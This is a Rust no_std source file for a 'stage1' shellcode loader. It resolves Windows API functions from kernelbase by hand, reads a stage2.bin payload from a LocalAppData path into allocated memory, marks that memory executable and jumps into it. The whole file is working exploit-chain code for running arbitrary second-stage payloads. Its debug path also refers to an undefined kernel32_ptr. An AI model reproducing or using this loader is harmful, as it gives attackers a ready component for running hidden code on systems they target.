#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

use core::arch::asm;
use core::mem::MaybeUninit;
use core::panic::PanicInfo;

use shellcode_utils::prelude::*;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

type Stage2Fn = fn() -> u64;

const STAGE2_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\stage2.bin"#, "\0");
const STAGE1_ERROR_FILE_OPEN_FAILED: u64 = 0x100000000_00000001;
const STAGE1_ERROR_FILE_READ_FAILED: u64 = 0x100000000_00000002;

#[used]
#[no_mangle]
// Required because compiler_builtins expects this symbol to be present
// and they only define it for UEFI environments
pub static _fltused: i32 = 0;

#[no_mangle]
pub extern "C" fn main() -> u64 {
    // unsafe {
    //     // clean argc and argv
    //     asm!("mov rcx, 0", "mov rdx, 0",);
    // }

    unsafe { asm!("and rsp, ~0xf") };

    let kernelbase_ptr = get_kernelbase();
    if kernelbase_ptr.is_none() {
        return 0x404;
    }
    let kernelbase_ptr = kernelbase_ptr.unwrap();

    let ReadFile = fetch_read_file(kernelbase_ptr);
    let CreateFileA = fetch_create_file(kernelbase_ptr);
    let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
    let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
    let GetFileSize = fetch_get_file_size(kernelbase_ptr);
    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);

    #[cfg(feature = "debug")]
    let OutputDebugStringA = fetch_output_debug_string(kernel32_ptr);

    macro_rules! debug_print {
        ($msg:expr) => {
            #[cfg(feature = "debug")]
            unsafe {
                OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _)
            }
        };
    }
    debug_print!("Hello from stage1");

    let mut stage2_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
    unsafe {
        (ExpandEnvironmentStringsA)(
            STAGE2_ENV_FILENAME.as_ptr(),
            stage2_filename.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&stage2_filename) as u32,
        );
    }

    // Open the stage2 payload
    let handle = unsafe {
        CreateFileA(
            stage2_filename.as_ptr() as *const i8,
            CreateFileAccess::GenericRead as u32,
            0,
            core::ptr::null_mut() as PVOID,
            4,    // OPEN_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut() as PVOID,
        )
    };

    if handle as usize == usize::MAX {
        #[cfg(not(feature = "debug"))]
        return STAGE1_ERROR_FILE_OPEN_FAILED;

        debug_print!("Opening stage2 file failed, got INVALID_HANDLE_VALUE");
        #[cfg(feature = "debug")]
        {
            debug_break!();
        }
    }

    let stage2_size = unsafe { GetFileSize(handle, core::ptr::null_mut()) };

    // Allocate memory for the stage 2 payload
    let stage2_data =
        unsafe { VirtualAlloc(core::ptr::null_mut(), stage2_size as usize, 0x3000, 4) };

    // Read the data from disk
    let mut remaining_size = stage2_size;
    let mut write_ptr = stage2_data;
    while remaining_size > 0 {
        let mut bytes_read = 0u32;

        unsafe {
            if ReadFile(
                handle,
                write_ptr,
                remaining_size,
                &mut bytes_read as *mut _,
                core::ptr::null_mut(),
            ) == 0
            {
                #[cfg(not(feature = "debug"))]
                return STAGE1_ERROR_FILE_READ_FAILED;

                debug_print!("Reading stage2 failed");
                #[cfg(feature = "debug")]
                {
                    debug_break!();
                }
            }
            write_ptr = write_ptr.offset(bytes_read as _);
        }
        remaining_size -= bytes_read;
    }

    let mut old_flags = 0u32;

    // Change the stage 2 payload's permissions
    debug_print!("Changing stage2 permissions");
    unsafe {
        VirtualProtect(
            stage2_data,
            stage2_size as usize,
            0x20,
            &mut old_flags as *mut _,
        )
    };

    debug_print!("Executing stage2");

    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_data) };
    stage2()
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
